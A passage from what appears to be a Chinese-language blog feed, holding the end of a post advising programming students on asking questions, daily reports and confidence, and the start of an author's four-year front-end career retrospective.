歲才開始當總統。<br>世上每個人本來就有自己的時區。<br>身邊有些人看似走在你前面，也有人看似走在你後面。<br>但其實每個人在自己的時區有自己的步程。<br>不用嫉妒或嘲笑他們。<br>他們都在自己的時區裡，你也是！<br>生命就是等待正確的行動時機。<br>所以，放輕鬆。<br>你沒有落後。<br>你沒有領先。<br>在命運為你安排的時區裡，一切都會準時。</p></blockquote><p>好好地看著自己，讓自己每天都比昨天更進步一點，只要這樣就夠了。</p><h3 id="想問問題卻不知道該怎麼問，怎麼辦？"><a href="#想問問題卻不知道該怎麼問，怎麼辦？" class="headerlink" title="想問問題卻不知道該怎麼問，怎麼辦？"></a>想問問題卻不知道該怎麼問，怎麼辦？</h3><p>很多初學者都會有兩個問題，第一個是不敢問問題，第二個是就算敢問，也不知道該怎麼問。</p><p>先來講第一個問題好了，為什麼不敢問問題呢？通常都是因為覺得這個問題很蠢、是個笨問題，所以<strong>沒有被提問的必要</strong>，或者是深怕這問題其實很簡單，自己就能夠找到答案，沒有必要麻煩別人。</p><p>先來講講我覺得什麼時候適合問問題，只要符合以下幾點條件我覺得就適合提問：</p><ol><li>仔細閱讀過錯誤訊息，但還是不知道錯誤在哪</li><li>把錯誤訊息拿去 Google 之後還是不知道怎麼解</li><li>卡這個問題卡了好一陣子（這邊的標準是一兩天）</li></ol><p>在我的教學計畫裡面，如果你滿足了這三點，無論你的問題是什麼，我都覺得很有提問的價值。因為你有努力過了，有嘗試著想要去解決問題。用盡各種手段之後還是沒辦法解決，這時候再提問就有很正當的理由，就不是大家口中說的那種伸手牌。</p><p>當然，我也有碰過還沒滿足這三點就來問我的學生，通常這時候我就會直接問說：「你把錯誤訊息用白話文解釋一遍給我聽」，並且一步步引導他們找到錯誤的地方。</p><p>或者是：「你有把這訊息拿去 Google 過嗎？你試了什麼解決方法」，雖然說我直接 Google 過後把解答丟給他可能是最省時間的方法，但是這並沒有解決任何問題。他下次碰到這問題時還是不會，因為解答是你幫他找的。</p><p>不過這其實也會碰到一個問題，那就是有時候學生花了一兩天解不開之後跑來找我，我卻花了一分鐘就把問題給點出來，並且讓他們發現解答。這時候很有可能會有這種反應：</p><blockquote><p>我是不是又問了一個蠢問題，怎麼這麼簡單的問題要卡這麼久？下次還是多注意一點好了</p></blockquote><p>首先，我看過的程式碼雖然沒有比你吃過的飯還多，但要用經驗來解決你們卡住的問題是綽綽有餘了。大部分在你們眼中看起來難解的問題，在我這邊都是小菜一碟，因為我經驗比你們豐富太多了。</p><p>所以當你在想「這麼簡單的問題」的時候，你其實搞錯對象了。對我來說當然是簡單的，你問課程內容相關的問題時都是簡單的，因為課程大綱是我訂的，我對自己教學的內容有一定的把握。可是對你來說，那不會是個簡單的問題，是個困難的問題，而且是個對你來說有價值的問題。</p><p>我上面所講的三個條件，說穿了就是你有付出一定的心力試圖解決這個問題，而我這邊也量化了「一定的」心力這件事。一旦滿足這三點以後，這問題對你來說就不是個「簡單的」問題了。</p><p>這時就是一個提問的好時機。若是讓自己再卡下去會拖到進度，而且該做的你都做了，你不應該期望哪天突然開竅理解問題，而是應該指望更實際一點的方法：<strong>問老師（或是問同學）</strong>。</p><p>不用擔心我是不是會覺得這是蠢問題，也不用擔心這問題是不是太簡單，這都不關你的事。你做好你的事：查資料之後試圖解決問題，解不開就來問我。而我也做好我的事，引導你找到問題的解答，若是你沒把本分做好，我會跟你說。</p><p>我這課程一向都很坦誠，有什麼都會誠實告訴你。我不希望你來猜我的心思，猜說這題是不是太簡單、猜說自己功課是不是有做足。我希望能夠以時間來衡量，當你卡在這問題上太久（一兩天），我覺得就是一個值得問的問題，請果斷來找我求助，我會幫助你判斷這件事，並且引導你找到解答。</p><p>當你克服了這個「怕自己問的問題是笨問題」的心理障礙以後，還有第二點，那就是儘管知道自己可以提問，卻不知道該怎麼問。</p><p>例如說跟程式碼相關的問題就比較好提問一點，因為你有 code 可以看，也有最後的錯誤訊息或是預期的輸出結果。但除此之外的問題都比較難一點，例如說今天要你做一個留言板你卻毫無頭緒，這個要拿什麼問題來問我？</p><p>針對這個點，我希望我們一樣用時間來當衡量標準。當你處於「我有問題，但我不知道問題是什麼，也不知道怎麼提問」的狀態兩天的時候，就來找我聊聊。</p><p>「不知道該怎麼提問」也算是問題的一種，所以一樣適用於上面那個標準。對我來說，我一直認為溝通是超級重要的事，有溝才有通。所以不是你自顧自地卡關，而是應該把現況跟我聊聊，就算不用真的問出什麼問題也好，至少讓我知道你現在的狀況是什麼，我們才會在同一頁上面。</p><p>除了電腦課的老師以外，我也希望學生們可以把我當作輔導室的老師，就算不是跟電腦相關的問題也可以來找我聊聊，我也都很願意傾聽。雖然能不能解決是另外一回事，但至少我們能夠同步，知道你現在是怎樣的狀況。</p><h3 id="每日進度報告到底要寫什麼？"><a href="#每日進度報告到底要寫什麼？" class="headerlink" title="每日進度報告到底要寫什麼？"></a>每日進度報告到底要寫什麼？</h3><p>在我的教學計畫裡有個東西叫做每日進度報告，主要是想知道你的學習狀況如何，另一方面也可以當作是個人筆記來使用。</p><p>如果不知道要寫什麼，當作日記來寫就好。這邊我之前已經寫過一篇文來做總結，可參考：<a href="/2019/02/06/why-blogging-ab77fd8c6ffa/">每一篇心得都有價值——為什麼初學者才更應該要寫心得筆記</a></p><h3 id="沒有自信該怎麼辦？"><a href="#沒有自信該怎麼辦？" class="headerlink" title="沒有自信該怎麼辦？"></a>沒有自信該怎麼辦？</h3><p>原本其實是沒有這一題的，畢竟自信這問題真的是靠北難解，但我讀了一些學生的報名信以後突然有了靈感。</p><p>如果是以前的我，可能會想盡辦法告訴你說要提升自己的自信，要看自己擁有什麼，而不是自己沒有什麼。</p><p>但在這邊，我只想告訴你一件事：</p><blockquote><p>我也跟你一樣。</p></blockquote><p>我也跟你一樣，看到比自己更厲害的人，會覺得自己什麼也不會。我也跟你一樣，看到一些不錯的工作職缺，卻因為覺得自己程度還差得遠而退卻。我也跟你一樣，自信時高時低，但比例大約是 2:8，大多數時候是沒自信的。</p><p>你可能覺得我在業界打混了一段時間，寫了這麼多文章也教了一些學生，一定很厲害。你這樣看我，我也這樣看著我覺得厲害的人，在自信這點上我跟你是一樣的。我也會看著那些很厲害的強者，想著自己離他們到底有多遠。</p><p>我不會告訴你如何提升自信或是如何處理自信問題，因為我自己也不擅長。我自己在過去的幾年也卡在這問題中，最近有比較好一點，但可能一陣子過後又會卡回去。</p><p>我只是想讓你知道，我也跟你一樣。</p><h3 id="結語"><a href="#結語" class="headerlink" title="結語"></a>結語</h3><p>我知道。</p><p>我知道，儘管我講了這麼多，你可能還是會抱持著原有的印象繼續走下去。</p><p>你可能認同我說的，認同應該不帶任何既定印象先學程式，認同照著自己的進度走就好，認同不知道怎麼問問題的時候，先發聲求救就對了；也認同心得可以當作日記在寫。</p><p>你理性上是認同的，覺得我說的有幾分道理，可是感性上卻不是這樣。</p><p>你在學程式卡關時，還是會覺得是不是因為自己數學不好；看到其他同學進度超前許多時，還是會覺得自己是不是太弱；不知道該怎麼問問題時依舊選擇沈默不語，寫心得時依舊句句斟酌、字字推敲，深怕他人覺得你在亂寫。</p><p>這我都知道，因為這很正常。</p><p>但這沒有關係，至少你已經跨出了第一步。至少你現在理性上同意這些論述，只是感性還沒跟上，還是被原有的思維習慣給綁架了。</p><p>要改變這些是需要時間的，但只要你跨出了第一步，需要的也只是時間而已。每一天都比昨天更進步一點，比昨天再多走一點，雖然說不知道終點在哪裡，但至少我們在前進著。</p>]]></content>
      
      
      <categories>
          
          <category> 學習 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 學習 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>成為前端工程師的四週年回顧</title>
      <link href="/2019/04/13/4-years-review-7fb7edc52687/"/>
      <url>/2019/04/13/4-years-review-7fb7edc52687/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/4-years-review-7fb7edc52687/1__PkZi0VUQN54__4HfXRMJVKw.jpeg"></p><p>如果你覺得這個標題似曾相識，這很正常。會寫這篇文章是因為之前看到 <a href="https://medium.com/u/e54b7fa62ad5">Lin Simon</a> 寫了這篇：<a href="https://medium.com/as-a-product-designer/%E6%88%90%E7%82%BA-ui-ux-%E8%A8%AD%E8%A8%88%E5%B8%AB%E7%9A%84%E4%B8%89%E9%80%B1%E5%B9%B4%E5%9B%9E%E9%A1%A7-e094b2565321">成為 UI&#x2F;UX 設計師的三週年回顧</a>。</p><p>看了看時間，發現自己居然也要入行四年了！剛好最近面臨一個人生的轉折點，想說可以趁著這個機會，好好地把自己這四年的心得記錄起來。</p><p>原本想要下個不同的標題，但想了許久之後還是覺得這個標題最貼切，因此就直接用這個標題致敬原文章了。</p><p>這一篇會著重在這四年來的工作經歷以及心路歷程，文章很長，真的很長。</p><p>再次提醒，真的很長。可以把它當成故事來看就好，不要預期可以從中獲得什麼。若是你對更早以前的事（關於我如何學程式）也有興趣，可參考<a href="/2017/10/05/the-programming-journey-1-b9b19c0ef05b/">《自學、哲學、講學：我的程式之路》</a>。</p><h3 id="2015-年-3-月：求職初體驗"><a href="#2015-年-3-月：求職初體驗" class="headerlink" title="2015 年 3 月：求職初體驗"></a>2015 年 3 月：求職初體驗</h3><p>還記得在找第一份工作的時候，我在 104 上面投了七十間公司，最後去了<a href="https://www.ptt.cc/bbs/Soft_Job/M.1431190145.A.D28.html">十五間公司面試</a>。現在挺懷念以前瘋狂面試的那段時光，連續兩個禮拜的時間幾乎天天排滿。最滿可以排到早上一間下午兩間，剛開始覺得挺有趣，但到了後來只覺得累，發現面試也是很耗體力的。</p><p>我那時是抱持著這樣的一個想法在面試的：</p><blockquote><p>說不定這是我第一次也是最後一次面試這麼多間了，因為過兩三年後搞不好我變得超厲害，都是公司主動來找我，不是我主動去找公司。</p></blockquote><p>雖然說這個想法看起來很有自信，但我那時其實處在一個自我矛盾的情況之中。</p><p>一方面我覺得自己是厲害的，我對自己的能力是有自信的。雖然說不是相關科系畢業甚至連大學都沒念完，但我有自信我比一堆本科系畢業的學生更有能力。因為我寫程式寫了十年，寫過後端、前端也寫過 Mobile App，總覺得要上手一個新的技術並不是難事，只是時間問題。</p><p>但另一方面我覺得自己是很弱的，我幾乎不理解底層概念。作業系統、網路 TCP&#x2F;IP、計算機組織，這些本科系的問題一問我就倒，大概只有演算法與資料結構勉強還行。雖然說寫程式寫了很久，但大多數只是自己做好玩的，完整度依舊比不上業界的專案，規模也相差許多。</p><p>當你懂的東西愈多，不懂的也會愈多。</p><p>而且那時我的朋友們都還在唸書，沒人可以跟我討論多少是合理的薪水範圍。我只能根據長期在 PTT 潛水的結果跟之前實習的公司願意開給我的薪水自己決定。</p><p>最後的結論是月薪 40k，我覺得大概值這個價。現在回頭看來簡直太低估自己，有些朋友聽到我入行時拿這個價錢還嚇了一跳，跟我說怎麼可能。但沒辦法，自己的個性就是這樣，寧可低估也不願意高估的後果就是如此。</p><p>在面試了許多公司拿到一些 offer 之後，我選擇了最想加入的一間：遊戲酒吧，那時的薪水是 38k * 13。</p><h3 id="2015-年-4-月-13-日：正式入行"><a href="#2015-年-4-月-13-日：正式入行" class="headerlink" title="2015 年 4 月 13 日：正式入行"></a>2015 年 4 月 13 日：正式入行</h3><p>會選這間公司的原因有幾個。第一，離家超近。我家住秀朗橋頭，公司在新店慈濟醫院附近，我騎車只要過個橋就快到了，大概五分鐘就能到公司，真的超近。</p><p>最後一關跟 CEO 面試時他問我想加入的理由，我也跟他說了這個，還直接對著窗外指給他看：你看，那棟是我家，很近吧！</p><p>第二，環境。這邊指的環境有兩個，第一個是實體的環境，辦公室走一個工業風，我超喜歡，入職以後都會給朋友看辦公室的照片。</p><p><img src="/img/4-years-review-7fb7edc52687/1__qv5HCWz__Loro1riMIJqtmg.jpeg"></p><p>第二個指的是公司的氛圍，在面試第一關的時候與一個附中學長聊得滿開心的，第二關跟 CTO 也聊得很不錯，整個公司看起來就是一間很不錯的新創，非常合我的胃口。在我的想像中新創就是比較自由，不會有大公司的那些包袱，無論是管理風格或者是做人處事都會更輕鬆一點，而這間看起來就是這樣。</p><p>第三個原因是技術，他們願意讓我進去以後學習 Node.js。那時候我的技術棧是 PHP 跟 Android，Node.js 正紅而且很潮，身為盲目追求流行的人當然想學一下。如果可以邊上班邊學新的技術，那就太棒了。</p><p>綜合以上三個理由，遊戲酒吧成了我正式入行第一間公司，現在回頭來看，我做了一個很不錯的選擇。</p><p>入職以後的生活跟我想像中的差不多，公司平均年齡挺年輕的，而且毫不意外的我是全技術組或甚至是全公司年紀最小的正職員工（雖然看臉完全看不出來）。公司環境優美氣氛佳，員工相處融洽，上班時也沒什麼太大壓力，工時也完全正常。</p><p>喔對了，忘記跟大家先介紹一下遊戲酒吧到底在做什麼。</p><p>我們的商業模式滿特別的，簡單來說就是發掘有潛力但已經過了高峰的遊戲，改頭換面以後重新上架，靠我們公司的行銷與營運團隊延長一款遊戲的生命週期。</p><p>例如說現在有款遊戲 A，上架了半年之後新用戶愈來愈少，開發商決定把資源投注在其他新的遊戲，因此遊戲 A 就頓時失去目光，成了遇不到伯樂的千里馬。這時候遊戲酒吧若覺得這款遊戲其實有機會，只是缺少了適當的行銷跟營運，就會去跟公司談合作，讓遊戲 A 換個名字之後重新在 Google Play 上架，乍看之下就是個新的遊戲，但遊戲內容完全一樣。</p><p>接著就是我們公司來維持這個遊戲的營運，會員跟金流系統都是走我們的，而營收會跟原公司拆成，這種模式叫做「聯運」，聯合營運，第一次聽到的時候我覺得超級特別，原來還有這種方式。</p><p>而這邊的遊戲主要指的是在 Google Play 上的手機遊戲，為什麼沒有 iOS 呢？因為 iOS 的政策較嚴，只是改名的話會被擋上架，所以只能做政策寬鬆的 Google Play。網頁遊戲也有做，但數量比較少。</p><p>從以上內容就可以看出來技術組要負責哪些東西，第一個當然是主要的會員與金流系統，還有官方網頁的維護。第二個則是 Android SDK，要提供給遊戲開發商串接我們的會員與金流系統。第三個是其他額外的服務，例如說我們自己的追蹤系統、推播系統、後台系統跟對外的活動網頁。</p><p>我其實忘記一開始是負責什麼了，可能是活動網頁吧？只記得進去時前兩週都在看 Node.js 相關的東西，當個薪水小偷。其他時間慢慢學習如何維護 Android SDK，要拿去給廠商串接，有技術問題也要試著解決。</p><p>後來公司想要做一個以玩家為主的聊天軟體 Poke，因此就專職做 Android 開發，與另外一個同事合作。體驗到想要做個「穩定」的聊天軟體真的靠北難，光是訊息收發這一塊就可以搞很久。魔鬼真的是藏在細節裡，每天都有一堆重要的小細節要處理。</p><p>開發了兩三個月後，產品還是定位不明（這之前就一再討論過了），覺得價值不大，於是專案就被砍了。後來另一位負責 Android 的同事跑去放了個長假，回來後我就被主管找進會議室，得知了他要離職的消息。</p><p>那時候我學到兩件事：</p><ol><li>如果不是固定在做 1 on 1 的公司，當主管找你談話時，一定是有什麼事情要發生（例如說有人要離職了）</li><li>有時放長假是離職的前兆，可能是想在離職前把年假都用掉</li></ol><p>同事走後，維護 Android SDK 的重責大任就交給我了，而那時我對這套系統已經有一定的熟悉程度，決定把看不順眼的地方都改一改。</p><p>第一，那時候每來一個新廠商就要重新編譯一個 jar 檔，因為要在裡面 hardcoded 一些 key（api key 之類的）。我原本提議說這些 key 可以寫在後端，啟動時再 call API 去拿，但若是碰到網路情況不好之類的情形會導致 SDK 無法啟動，體驗很差，因此這條路行不通。</p><p>後來跟另一個同事討論過後，想到 jar 檔其實就只是一個壓縮檔而已，可以把 jar 解壓縮之後把專門放這些 key 的資源換掉再重新壓縮回去，就不用重新編譯，節省了許多時間。</p><p>而且一但這樣做之後，就可以寫一個後台系統，讓營運人員只要填寫必要的 key（或甚至根本不用填，由系統自動產生）就能自動產生 SDK 並交給廠商，完全不需要技術組的介入。</p><p>我們那時有個最終的夢想，是遊戲廠商幾乎不用串接 SDK，我們就能自動把 SDK 接上去。原理是反編譯 apk 之後覆蓋相關的 function call，所以也花了不少時間研究反編譯跟重新打包，是一段很有趣的經歷，那時也寫了這篇文章：<a href="https://github.com/aszx87410/blog/issues/5">人人都會的 Android Apk 反編譯</a>。</p><p>第二，當時很大的一個困擾是當我們想更新 SDK 時，需要超級多時間。不是我們的時間，而是廠商的時間。廠商要再排時間串接新的 SDK，儘管 API 都沒變，還是需要再測試一遍，小廠還行，大廠的話要等到兩三個月後，等到頭髮都白了。</p><p>我跟另一個同事花了些時間研究了現成的解決方案，最後實作出了一套簡單的熱更新系統。原理是把程式邏輯包成 dex 檔，在程式執行時從 Server 把 dex 檔下載並載入之後執行，因此只要我們更新 dex 檔，SDK 的邏輯就會自動更新。</p><p>有了這套熱更新系統以後，廠商只要串一次新的 SDK，之後想要埋點或者是更改邏輯、修 bug 都可以不透過他們，只要我們這邊自己處理即可，節省了許多時間。</p><p>第三，文件及教育訓練。有了許多與廠商交手的經驗之後，就會知道哪些問題最容易被提出，因此我更新了 SDK 的技術文件，把這些常見問題都加上去。碰到問題時在常見問題裡面就能夠找到解答，完全不需要問到我。</p><p>再者，除了我以外，第一線會接觸到廠商的其實是營運的同事們。最常見的狀況就是當問題發生時，他們分不清楚是廠商的問題、後端的問題還是 Android SDK 的問題。這很合理，因為他們不是工程師，所以通常都透過我來轉介到正確的人。</p><p>但時間久了以後我也慢慢可以歸納出問題類型，因此寫了一份文件，只要照著上面的指示通常就能知道問題出在哪，也幫他們科普了 SDK、API 這些名詞，希望能讓他們對這些東西有最基本的理解。</p><p>甚至還跟同事合作在公司內部<a href="http://slides.com/aszx87410/cs-lesson1#/">開了課</a>，教一些最基礎的程式相關概念，這堂課就是我在 Hahow 所開設的線上課程的前身。</p><p>我那時不覺得自己做了什麼了不起的事，只是很直覺地把重複性的東西自動化跟標準化，工程師不就是這樣嗎？同樣的 function 寫了兩次以後就要抽出來變成一個，冗餘的 code 就是要重構寫得更漂亮。</p><p>一直到後來我才發現，這些我覺得沒什麼的事才是重要的事。時間就是資源，節省了時間就增加了更多可利用的資源，從這些重複性極高的事情中解放以後，工程師就有更多時間去做其他更有價值的事。</p><p>我的工作表現反映在績效上面，主管對我讚譽有加，認為我超出了她的期待，不只是改善我自己負責的東西，也讓技術組的整體氛圍變得更好。</p><p>績效則反映在薪水上，滿三個月時調薪到 43k，領年終時也拿了三四個月；待滿一年時調到 55k，看到調過的薪水我嚇了一跳：「哇，原來月薪五萬就是這種感覺嗎…」，還因為績效很好被公司送了一張去東京的來回機票做為獎勵。</p><p><img src="/img/4-years-review-7fb7edc52687/1__KbzJWSfJElSS__kZrtmIdYQ.jpeg"></p><p>解決了 Android SDK 的問題以後，開始負責一個公司內部的廣告相關系統，前後端分離，採用正開始展露頭角的 React + Redux（好像還在 0.14 版的時候），從那之後就奠定了自己想走前端的這個方向。</p><p>也在那時期寫了一些與 redux 或是工作內容相關的文章，像是<a href="https://github.com/aszx87410/blog/issues/2">《Promise, generator, async與ES6》</a>、<a href="https://github.com/aszx87410/blog/issues/3">《redux 簡介》</a>、<a href="https://github.com/aszx87410/blog/issues/4">《redux的middleware詳解》</a>、<a href="https://github.com/aszx87410/blog/issues/7">《快速取得 apk 相關資訊》</a>、<a href="https://github.com/aszx87410/blog/issues/8">《資料庫的好夥伴：Redis》</a>、<a href="https://github.com/aszx87410/blog/issues/10">《與 DDoS 奮戰：nginx, iptables 與 fail2ban》</a>等等。</p><p>在遊戲酒吧將近這一年半的時光裡面，我學到了很多。對我來說最重要的是擴展知識的廣度。在加入以前，我甚至連 ssh 都不知道是什麼。因為以前只會租虛擬主機，用 ftp 把 php 檔丟到上面，從來都沒有自己連接過主機。</p><p>但是在這邊除了前後端跟 Mobile 都有幾分涉獵以外，在伺服器的架構上也多了幾分理解，知道什麼是 cluster、load balance，也體驗部署了 node.js 的專案。從現在看來，我依舊覺得這是一段很棒的經歷，給了我足夠的經驗與養分，讓我往下一個階段發展。</p><p>在我入行的第一年，我缺的不是實力，是舞台。感謝遊戲酒吧給了我一個很適合的舞台，讓我展現能力。</p><h3 id="2016-年-8-月：重返學校"><a href="#2016-年-8-月：重返學校" class="headerlink" title="2016 年 8 月：重返學校"></a>2016 年 8 月：重返學校</h3><p>2016 年 7 月底，我離職了。最主要的原因是我打算復學回去唸書。</p><p>當初決定休學時，我以為我一輩子都不會再回去唸書，但沒想到休學了兩年以後，讓我找到了一個理由。</p><p>出社會之後我意識到了一件事。若是你不主動參加任何活動，你是認識不了新朋友的。而且這種活動的目的通常就是讓你認識新朋友。</p><p>但學校不一樣，學校是一個能夠最自然讓你交朋友的環境，你們可能同系、可能同組或是同社團，不用刻意的團康活動或是尷尬的大家好，合作久了，自然就成了朋友。</p><p>在遊戲酒吧工作的時候，其實我偶爾還會回學校去幫忙一個專案：InfoPlat，他們想做一些跟台大相關的資訊平台。看到在找人的訊息以後就決定要加入這團隊，一方面是這跟我還在學校時想做的東西很像，另一方面也是想說可以維持著跟台大的連結，假裝自己還是個學生。</p><p>最後由一些背景不同，但大部分是工程師與設計師組成的團隊，與台大的不一樣思考社合作。我們跑了一遍 design thinking 的流程，試圖做出一個厲害的產品。</p><p>雖然最後產出的結果不算成功，中間也經歷了許多調整，但我很喜歡合作的過程：「阿，原來跟志同道合的朋友們合作是這種感覺」，也就是因為體驗到了這種感覺，成了我復學的契機。</p><p>我復學不是為了畢業，我也沒打算畢業，我只是想報名資訊種子跟創創學程而已。</p><p>這兩個東西對我來說滿類似的，我懶得詳細介紹了，有興趣的可以自己去找資料。總而言之，都是讓我有一個機會可以跟其他人合作一些專案，是我滿嚮往的環境。而且我也很期待我的背景 — — 一個有實戰經驗的工程師 — — 能夠帶給團隊什麼樣的改變。</p><p>原本想說這兩個計劃的申請我應該都輕鬆上才對，結果資訊種子連面試機會都沒有，創創學程備取一。原因可能是我太荏懶，報名表都隨意填填，沒有把自己的優勢顯示出來。或者也有可能我表現出來了，但不是這個計畫想要的。</p><p>七月底離職以後，就等著九月中的開學以及九月初三天兩夜的「創創達人營」，說穿了就是創創學程的迎新活動。</p><p>原本我以為就這樣了，從社會人士回歸到學生身份更有感觸一點，知道自己在學校時真正想要的是什麼，而不是像以前還在學時那樣得過且過（但我覺得得過且過也沒什麼不好就是了）。</p><p>但是，就在八月中的時候，我收到了一封來自 Garena 新加坡的 Facebook 訊息（對，是用 Facebook 傳的）。</p><p>內容大意就是：</p><p>安安，這裡是 Garena，我們是總部在新加坡，但在東南亞各地都有分公司的新創獨角獸，旗下主要的產品有蝦皮跟遊戲代理（英雄聯盟），這裡有 80 幾個工程師，都有很紮實的基礎，有些比過 IOI、ACM ICPC 還拿過牌。</p><p>公司還在持續擴張中，有興趣來試試看嗎？你應該認識的 OO 跟 XX 之前才來公司參觀過。</p><p>收到訊息以後，我驚訝了兩次。</p><p>第一次是：為什麼找上我？根據在訊息裡面的敘述，他提到的人是平常有在打程式競賽的學弟，後來發現其他朋友也有收到訊息，而在訊息裡其實也有提及找上我是因為我 2009 年的時候有比過程式競賽（這部分可參考：<a href="/2017/10/05/the-programming-journey-2-98dea8c475ae/">自學、哲學、講學：我的程式之路（中）</a>），可是那已經是好幾年前的事了。</p><p>第二次驚訝則是：Garena 居然是聽起來這麼厲害的一間公司？在這之前我對它的印象只有英雄聯盟代理商，其餘一無所知，從來沒想過我居然會有覺得 Garena 厲害的一天。</p><p>但我回絕了。我說我比程式競賽的時候已經是好幾年前的事了，之後都沒有再碰過。想找這類人的話可能找錯人了，我雖然還是工程師，但是能力跟他們差得遠了。雖然我對 Garena 很有興趣，但怕自己能力不符。</p><p>那時對方聽完之後回了一句：「那你要先面試看看嗎？」</p><p>我就說：「好」</p><p>那一刻我領悟到一件事。在找工作的時候，不要自己把自己刷掉。若是不敢投的原因是覺得自己能力不足，背後的可能有兩個：實力夠但自信不足、實力真的不夠。</p><p>但我要怎麼驗證到底是哪個？</p><p>我無從驗證。</p><p>一但拒絕了面試的邀請，我就永遠不會知道答案是什麼。所以沒什麼好不答應的。若是我真的沒實力，在面試時對方自己會把我刷掉；若其實是自信問題，那我就賺到了，證明我其實比我想像中的更有能力。</p><p>原本不抱任何期待的我，通過了一面、二面甚至是三面。部分應該歸功於儘管是新加坡公司，面試卻是全中文的，讓我跟面試官的溝通沒有語言障礙，才會如此順利。</p><p>我把面試題目寫在這：<a href="https://github.com/aszx87410/blog/issues/15">記一次軟體工程師面試心得</a> ，有興趣可以看看。</p><p>三面已經面到大主管了，照理來說是最後一關，面完之後其實挺緊張的。剛好那時候也到了參加創創達人營的時間，我就想說真剛好，可以讓我們有個機會放鬆，去玩個幾天回來應該就會有結果了。反正上了就去，沒上的話就維持原訂計畫。</p><p>結果營隊的第一天，HR 就寫信跟我說他們那邊還要再進行一輪面試，而且想要盡快。我回信說我在參加一個營隊可能不太方便，但對方說只要大概一小時就好，晚上也行，希望能盡快把這面試搞定。</p><p>迫於無奈之下我跟隊輔借了筆電，在其他人還在玩培養向心力的活動的時候，我在其中一個小房間跟 Garena 進行最後一關的面試。</p><p>現在想想還是滿好笑的，怎麼會在一個這麼奇妙的情況下面試？而且最後一關問了滿多東西，面了大概一個半小時。</p><p>面完之後覺得通體舒暢，終於面完了。那時覺得自己表現不錯，已經半個人在新加坡了，雖然說一直告訴自己得失心不要太重，但做不到啊！</p><p>過了幾個小時，到了晚上八點，我已經忘記那時候在進行什麼活動了，發現手機震動之後我拿起來看。看了 Android 的通知列，是一封新信，標題是：「Offer letter for Hu Li from Garena」。</p><p>我轉過頭去跟我隔壁的同學說：「欸欸，我錄取了，我又要再休學一次了，大家掰掰」</p><p>我想回學校，但是老天爺不讓我回，因為我要去新加坡了。</p><h3 id="2016-年-9-月：學校掰，新加坡嗨"><a href="#2016-年-9-月：學校掰，新加坡嗨" class="headerlink" title="2016 年 9 月：學校掰，新加坡嗨"></a>2016 年 9 月：學校掰，新加坡嗨</h3><p>一直到很後來我才知道，當初第三面的確就是最後一面，會有第四面是因為蝦皮看到我的履歷有興趣也想面面看，所以第四面的面試官是蝦皮的技術負責人。</p><p>都還沒開學，連教室都還沒踏進去過，我就先回學校的各處室又辦了一次休學。這次休學，我是沒有打算再復學的。</p><p>前面有提到我想復學的理由，但跟這理由比起來，去新加坡工作的機會更吸引我，我一點猶豫都沒有，就決定要去工作了。</p><p>我想去海外工作嗎？想，而且之前就想，我相信很多人也一樣嚮往去海外工作。但我覺得自己還不夠格。以我原本的規劃，大概在台灣再待個兩三年，把英文練好一點之後才能達到出國工作的基本門檻。語言都搞不定，談什麼出國工作。</p><p>但神奇的事發生了，居然有一間在新加坡的公司找上我，而且面試還全中文，最後還錄取了！天上掉下來的機會，怎麼可能不拿。想回學校隨時可以回去，但去海外工作可不是說想去就能去的。</p><p>這次的歷程又讓我反思了一次自己是不是應該加強自己的自信，總覺得自信好像跟不上實力。但我依舊處於矛盾當中，一方面覺得自己實力不錯，但看看那些我覺得實力真的不錯的人，卻覺得自己還差得遠呢。</p><p>儘管如此，我還是有了一些轉變。</p><p>我不再是那個別人找你面試卻自覺實力不夠還婉拒的人。對自己能力的判斷是會被自信影響的，一點都不客觀。雖然讓別人來面試你也不一定客觀，但至少是另外一種反映自身能力的管道。</p><p>以前的我是：「我不夠好，不投了」；現在的我是：「我可能不夠好，但幹嘛不投？投了又沒有損失，我擔心自己會不會錄取幹嘛？反正不行的話公司會把我刷掉，沒必要自己先刷掉自己」</p><p>去海外工作，我唯一擔心的事情是工作簽證會不會因為學歷問題而過不了，因為我知道有些工作簽證是會考量學歷、經歷跟薪水的，等了大概一個月以後拿到了新加坡的工作簽證（SP），放下了心中的大石頭。</p><p>至於薪水的部分直接從上一份的 55k 變兩倍，原來年薪百萬是這種感覺。</p><h3 id="2016-年-10-月：第一次在海外工作"><a href="#2016-年-10-月：第一次在海外工作" class="headerlink" title="2016 年 10 月：第一次在海外工作"></a>2016 年 10 月：第一次在海外工作</h3><p>海外工作最麻煩的住宿問題在公司協助下輕鬆搞定，住在公司提供的「要錢的」宿舍。簡單來說就是公司當二房東，租房子之後轉租給你，對員工來說挺方便的，想走就走完全不用綁約。</p><p>在上班前我對公司有一些期待，我想說公司這麼大工程師這麼多，應該會被分到一個專做前端的 team，可能有五六個人還有一個很強的 team lead，有些人資深有些資淺，而我是資淺的那一個，可以從其他人身上學到很多。</p><p>進去之後發現這只是我單方面的想像而已，我被分到了一個 Garena 的全新產品：Garena LIVE。用一句話來解釋，就是 Garena 想做自己的 Twitch — — 遊戲直播平台。</p><p><img src="/img/4-years-review-7fb7edc52687/1__blM8eJwxsDn09WI0NgZjbQ.png"></p><p>這個專案有一個 PM、一個設計師、一個後端工程師與一個前端工程師，那個前端工程師就是我。專案的雛型已經有了，主要功能都做好了，是一個從泰國被調來新加坡的工程師完成的。</p><p>而我要做的事情就是跟他交接，他一個月後就要回去泰國了。儘管到了大公司，但我的職責依舊沒變，還是一人前端團隊，一個人搞定所有前端的東西，跟想像中的完全不一樣。</p><p>這邊得到的啟示是儘管是大公司，還是要看你在哪個 team。每一個 team 都不一樣，環境還是有可能跟你待在新創公司一樣。不過如果去蝦皮的話，好像就真的是我想像的那樣。</p><p>沒有前端團隊，就繼續當一人戰隊吧，一個人也可以學到很多。而且這個專案會對我的履歷很加分，怎麼看都是利多。</p><p>儘管之後團隊變大，補了兩個後端也補上一個 PM，但依舊維持著大概五個人左右的規模，而前端始終只有我一個，我連代理人都沒有。所以每當我回台灣休假的時候，整個專案的前端就停擺了，完全沒辦法修 bug 或是加新功能。</p><p>在 Garena 的這一年是我首次專注在前端開發上，完全不用理會其他的事情。由於是一個人負責整個專案，因此前端技術上的成長較快，最大的收獲是對 React + Redux 的熟悉度比之前高了幾個檔次，但也很快地碰到了瓶頸。</p><p>一個人的好處就是想玩什麼沒人管你，你今天想用最新最潮的 library 也行，寫一堆爛 code 也可以，也不會有其他人看到你的 